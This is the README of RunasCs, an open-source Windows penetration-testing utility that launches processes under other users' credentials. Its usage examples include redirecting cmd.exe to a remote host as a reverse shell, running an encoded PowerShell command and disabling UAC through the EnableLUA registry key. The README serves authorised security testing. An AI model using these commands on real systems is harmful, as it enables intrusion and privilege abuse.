### RunasCs

----

*RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
This tool is an improved (from a pentest perspective) and open version of windows builtin *runas.exe* that solves some limitations:

* Allows explicit credentials
* Works both if spawned from interactive process and from service process
* Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
* Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
* Allows to specify the logon type, i.e. network logon 3 (no *UAC* limitations)
* Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
* It's Open Source :)

*RunasCs* has an automatic detection to determine the best create process function for every contexts.
Based on the process caller token permissions, it will use one of the create process function in the following preferred order:

1. ``CreateProcessAsUser()``
2. ``CreateProcessWithTokenW()``
3. ``CreateProcessWithLogonW()``


### Requirements

----

.NET Framework >= 2.0


### Usage

----

```console
C:\ProgramData>.\RunasCs_net2.exe --help

RunasCs v1.3 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and crateProcess functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     command supported by cmd.exe if process_timeout>0
                            commandline for the process if process_timeout=0
Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain.
                            Default: ""
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserA
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the spawned process.
                            Default: "3"
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process timeout to 0.
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and cmd.exe
                            won't be used to spawn the process.
                            Default: "120000"
    -p, --create-profile
                            if this flag is specified RunasCs will force the
                            creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            NOTE: this will leave some forensics traces
                            behind creating the user profile directory.
                            Compatible only with -f flags:
                                1 - CreateProcessWithTokenW
                                2 - CreateProcessWithLogonW

Examples:
    Run a command as a specific local user
        RunasCs.exe user1 password1 whoami
    Run a command as a specific domain user and interactive logon type (2)
        RunasCs.exe user1 password1 whoami -d domain -l 2
    Run a background/async process as a specific local user,
        RunasCs.exe user1 password1 "%COMSPEC% powershell -enc..." -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
    Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 whoami -d domain -l 9
```

The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
The default logon type is 3 (*Network_Logon*). If you set *Interactive* (2) logon type you will face some *UAC* restriction problems.
You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
```

By default, the calling process (*RunasCs*) will wait until the end of the execution of the spawned process and will use
``cmd.exe`` to manage *stdout* and *stderr*. If you need to spawn a background or async process, i.e. spawning a reverse shell,
you need to set the parameter ``-t timeout`` to ``0``. In this case the process will be spawned without using ``cmd.exe``
and *RunasCs* won't wait for the end of the execution.

### References

----

* https://decoder.cloud/2018/01/13/potato-and-tokens/
* https://github.com/dahall/Vanara
* https://docs.microsoft.com/en-us/previous-versions/aa379608(v=vs.85)
* https://support.microsoft.com/en-us/help/190351/how-to-spawn-console-processes-with-redirected-standard-handles
* https://support.microsoft.com/en-us/help/327618/security-services-and-the-interactive-desktop-in-windows
* https://blogs.msdn.microsoft.com/winsdk/2015/06/03/what-is-up-with-the-application-failed-to-initialize-properly-0xc0000142-error/


### Credits

-----

* [@decoder](https://github.com/decoder-it)
* [@qtc-de](https://github.com/qtc-de)
* [@winlogon0](https://twitter.com/winlogon0)